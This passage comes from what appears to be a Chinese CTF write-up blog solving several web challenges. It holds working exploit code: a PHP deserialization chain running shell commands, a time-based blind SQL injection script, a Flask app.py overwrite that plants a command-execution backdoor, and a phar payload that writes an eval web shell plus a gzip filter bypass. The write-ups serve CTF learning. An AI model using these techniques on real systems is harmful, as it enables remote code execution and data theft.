</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Crypto</span><span class=p>{</span> <span class=k>public</span> <span class=nv>$obj</span><span class=p>;</span> <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$w</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Web</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$w</span><span class=o>-&gt;</span><span class=na>func</span> <span class=o>=</span> <span class=s1>&#39;system&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=c1>//$w-&gt;var  = &#39;ls /&#39;;
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$w</span><span class=o>-&gt;</span><span class=na>var</span>  <span class=o>=</span> <span class=s1>&#39;cat /f*&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$p</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Pwn</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$p</span><span class=o>-&gt;</span><span class=na>obj</span> <span class=o>=</span> <span class=nv>$w</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$r</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Reverse</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$r</span><span class=o>-&gt;</span><span class=na>func</span> <span class=o>=</span> <span class=nv>$p</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$c</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Crypto</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$c</span><span class=o>-&gt;</span><span class=na>obj</span> <span class=o>=</span> <span class=nv>$r</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$s</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Start</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$s</span><span class=o>-&gt;</span><span class=na>errMsg</span> <span class=o>=</span> <span class=nv>$c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$payload</span> <span class=o>=</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$s</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>substr</span><span class=p>(</span><span class=nv>$payload</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>),</span> <span class=nx>PHP_EOL</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=midsql>midsql</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$cmd</span> <span class=o>=</span> <span class=s2>&#34;select name, price from items where id = &#34;</span><span class=o>.</span><span class=nv>$_REQUEST</span><span class=p>[</span><span class=s2>&#34;id&#34;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nv>$result</span> <span class=o>=</span> <span class=nx>mysqli_fetch_all</span><span class=p>(</span><span class=nv>$result</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$result</span> <span class=o>=</span> <span class=nv>$result</span><span class=p>[</span><span class=mi>0</span><span class=p>];</span>
</span></span></code></pre></td></tr></table></div></div><p>没给waf，但是好像没什么waf，不知道有什么黑魔法，第一个字符我用大于小于手动出来是<code>c</code>，但是我用等号吧，他又不延时</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://79972a33-c957-4446-a719-2f9e743e59a8.node5.buuoj.cn:81/&#34;</span>
</span></span><span class=line><span class=cl><span class=n>result</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>DELAY_THRESHOLD</span><span class=o>=</span><span class=mi>2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>i</span> <span class=o>=</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=n>head</span> <span class=o>=</span> <span class=mi>32</span>
</span></span><span class=line><span class=cl>    <span class=n>tail</span> <span class=o>=</span> <span class=mi>127</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>head</span> <span class=o>&lt;</span> <span class=n>tail</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>mid</span> <span class=o>=</span> <span class=p>(</span><span class=n>head</span> <span class=o>+</span> <span class=n>tail</span><span class=p>)</span> <span class=o>//</span><span class=mi>2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># payload = f&#39;&#39;&#39;if(ascii(substr(database(),{i},1))&gt;{mid},sleep(2),0)%23&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>        <span class=c1># ctf</span>
</span></span><span class=line><span class=cl>        <span class=c1># payload = f&#34;if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#39;ctf&#39;)),{i},1))&gt;{mid},sleep(2),0)%23&#34;</span>
</span></span><span class=line><span class=cl>        <span class=c1># items</span>
</span></span><span class=line><span class=cl>        <span class=c1># payload = f&#34;if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema)like(&#39;ctf&#39;)and(table_name)like(&#39;items&#39;)),{i},1))&gt;{mid},sleep(2),0)%23&#34;</span>
</span></span><span class=line><span class=cl>        <span class=c1># id,name,price</span>
</span></span><span class=line><span class=cl>        <span class=c1># payload = f&#34;if(ascii(substr((select(group_concat(id,name,price))from(items)),{i},1))&gt;{mid},sleep(2),0)%23&#34;</span>
</span></span><span class=line><span class=cl>        <span class=c1># payload = f&#34;if(ascii(substr((select/**/group_concat(id,0x2c,name,0x2c,price)/**/from/**/ctf.items),{i},1))&gt;{mid},sleep(2),0)%23&#34;</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;if(ascii(substr((select/**/concat_ws(0x2c,id,name,price)/**/from/**/ctf.items/**/limit/**/2,1),</span><span class=si>{</span><span class=n>i</span><span class=si>}</span><span class=s2>,1))&gt;</span><span class=si>{</span><span class=n>mid</span><span class=si>}</span><span class=s2>,sleep(3),0)%23&#34;</span>
</span></span><span class=line><span class=cl>        <span class=c1># print(payload)</span>
</span></span><span class=line><span class=cl>        <span class=n>start_time</span> <span class=o>=</span> <span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=o>+</span><span class=s2>&#34;?id=&#34;</span><span class=o>+</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>request_time</span> <span class=o>=</span> <span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span> <span class=o>-</span> <span class=n>start_time</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>request_time</span> <span class=o>&gt;=</span> <span class=n>DELAY_THRESHOLD</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Delay triggered! ASCII &gt; </span><span class=si>{</span><span class=n>mid</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>head</span> <span class=o>=</span> <span class=n>mid</span> <span class=o>+</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;No delay. ASCII &lt;= </span><span class=si>{</span><span class=n>mid</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>tail</span> <span class=o>=</span> <span class=n>mid</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>head</span> <span class=o>!=</span><span class=mi>32</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>result</span> <span class=o>+=</span> <span class=nb>chr</span><span class=p>(</span><span class=n>head</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span> <span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>result</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>result</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>纳尼，居然注入不出来flag，我在想这个东西还科不科学了</p><h2 id=flask-disk>flask disk</h2><p>开启了debug模式直接覆盖掉<code>app.py</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/upload</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>5426ce9e-a0bf-49a3-a7a9-e2000adf6592.node5.buuoj.cn:81</span>
</span></span><span class=line><span class=cl><span class=n>Cache-Control</span><span class=o>:</span> <span class=l>max-age=0</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>http://5426ce9e-a0bf-49a3-a7a9-e2000adf6592.node5.buuoj.cn:81</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>multipart/form-data; boundary=----WebKitFormBoundary2Ll9uYmCfKuKAWRn</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://5426ce9e-a0bf-49a3-a7a9-e2000adf6592.node5.buuoj.cn:81/upload</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>708</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>------WebKitFormBoundary2Ll9uYmCfKuKAWRn
</span></span><span class=line><span class=cl>Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;app.py&#34;
</span></span><span class=line><span class=cl>Content-Type: text/plain
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>from flask import Flask,request
</span></span><span class=line><span class=cl>import os
</span></span><span class=line><span class=cl>app = Flask(__name__)
</span></span><span class=line><span class=cl>@app.route(&#39;/&#39;)
</span></span><span class=line><span class=cl>def index():    
</span></span><span class=line><span class=cl>    try:        
</span></span><span class=line><span class=cl>        cmd = request.args.get(&#39;cmd&#39;)        
</span></span><span class=line><span class=cl>        data = os.popen(cmd).read()        
</span></span><span class=line><span class=cl>        return data    
</span></span><span class=line><span class=cl>    except:        
</span></span><span class=line><span class=cl>        pass    
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>    return &#34;1&#34;
</span></span><span class=line><span class=cl>if __name__==&#39;__main__&#39;:    
</span></span><span class=line><span class=cl>    app.run(host=&#39;0.0.0.0&#39;,port=5000,debug=True)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>------WebKitFormBoundary2Ll9uYmCfKuKAWRn--
</span></span></code></pre></td></tr></table></div></div><p>传好之后直接R就行了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?cmd=cat%20/flag
</span></span></code></pre></td></tr></table></div></div><h2 id=pharone>PharOne</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Flag</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$cmd</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=o>@</span><span class=nx>exec</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cmd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>unlink</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>]);</span>
</span></span></code></pre></td></tr></table></div></div><p>可以phar反序列化，写个木马就行了，</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Flag</span><span class=p>{</span> <span class=k>public</span> <span class=nv>$cmd</span><span class=p>;}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>ini_set</span><span class=p>(</span><span class=s1>&#39;phar.readonly&#39;</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>unlink</span><span class=p>(</span><span class=s1>&#39;phar.phar&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>unlink</span><span class=p>(</span><span class=s1>&#39;phar.jpg&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$phar</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Phar</span><span class=p>(</span><span class=s1>&#39;phar.phar&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>startBuffering</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>setStub</span><span class=p>(</span><span class=s2>&#34;GIF89a&#34;</span><span class=o>.</span><span class=s2>&#34;&lt;?php __HALT_COMPILER(); ?&gt;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>addFromString</span><span class=p>(</span><span class=s1>&#39;a.txt&#39;</span><span class=p>,</span> <span class=s1>&#39;x&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$o</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Flag</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$o</span><span class=o>-&gt;</span><span class=na>cmd</span> <span class=o>=</span> <span class=s2>&#34;echo &#39;&lt;?php @eval(</span><span class=se>\$</span><span class=s2>_POST[1]);&#39; &gt; /var/www/html/shell.php&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>setMetadata</span><span class=p>(</span><span class=nv>$o</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>stopBuffering</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nx>rename</span><span class=p>(</span><span class=s1>&#39;phar.phar&#39;</span><span class=p>,</span> <span class=s1>&#39;phar.jpg&#39;</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>压缩成gz绕过<code>!preg_match("/__HALT_COMPILER/i",FILE_CONTENTS)</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>gzip -c phar.jpg &gt; exp.phar.gz
</span></span></code></pre></td></tr></table></div></div><p>上传上去</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/index.php</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>85f86257-1d6e-483d-a846-c0f9ac1ce905.node5.buuoj.cn:81</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>multipart/form-data; boundary=----WebKitFormBoundaryPASYrqSA9GBt07ei</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://85f86257-1d6e-483d-a846-c0f9ac1ce905.node5.buuoj.cn:81/index.php</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>http://85f86257-1d6e-483d-a846-c0f9ac1ce905.node5.buuoj.cn:81</span>
</span></span><span class=line><span class=cl><span class=n>Cache-Control</span><span class=o>:</span> <span class=l>max-age=0</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>837</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>------WebKitFormBoundaryPASYrqSA9GBt07ei
</span></span><span class=line><span class=cl>Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;exp.jpg&#34;
</span></span><span class=line><span class=cl>Content-Type: image/jpeg
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>{{unquote(&#34;\x1f\x8b\x08\x087\x0d\x97h\x00\x03phar.jpg\x00s\xf7t\xb3\xb0L\xb4\xb1/\xc8\x28P\x88\x8f\xf7p\xf4\x09\x89w\xf6\xf7\x0d\xf0\xf4q\x0d\xd2\xd0\xb4V\xb0\xb7\xe3\xe5\xeaa```\x04bA\x28\xcd\xc0\x10\x09\xc4\xfeV&amp;VJn9\x89\xe9JV\x86V\xd5\xc5V\xc6VJ\xc9\xb9\x29J\xd6\xc5V\xa6fVJ\xa9\xc9\x19\xf9\x0a\xea\x10c\x1dR\xcb\x12s4T\xe2\x03\xfc\x83C\xa2\x0dc5\xad\xd5\x15\xec\x14\xf4\xcb\x12\x8b\xf4\xcb\xcb\xcb\xf53Jrs\xf4\x8b3Rsr\xf4\x80\x8a\x95\xackY\x81\x86&#39;\xea\x95T\x94\x80\xec2\xe7\x9d\x9e\x01\xa2\x9b\xc5\xee\xf4l\x83X\xceP\xc1\xb1\x84W\xceqj\x9d\xdb\xb7\xa5\xe7\xb4W\xab\xf2_\xb6mxo\xc2\x04\x94pw\xf2u\x02\x00\x1e\xf6\xb4\x95\xd0\x00\x00\x00&#34;)}}
</span></span><span class=line><span class=cl>------WebKitFormBoundaryPASYrqSA9GBt07ei--
</span></span></code></pre></td></tr></table></div></div><p>就成功getshell了</p><h2 id=unserialize-again>Unserialize Again</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>  
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>story</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$user</span><span class=o>=</span><span class=s1>&#39;admin&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$pass</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$eating</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$God</span><span class=o>=</span><span class=s1>&#39;false&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__wakeup</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>user</span><span class=o>=</span><span class=s1>&#39;human&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=mi>1</span><span class=o>==</span><span class=mi>1</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=k>die</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=mi>1</span><span class=o>!=</span><span class=mi>1</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=nv>$fffflag</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>user</span><span class=o>=</span><span class=s1>&#39;AshenOne&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>eating</span><span class=o>=</span><span class=s1>&#39;fire&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>die</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__tostring</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>user</span><span class=o>.</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>pass</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__invoke</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>user</span><span class=o>==</span><span class=s1>&#39;admin&#39;</span><span class=o>&amp;&amp;</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>pass</span><span class=o>==</span><span class=s1>&#39;admin&#39;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=nv>$nothing</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
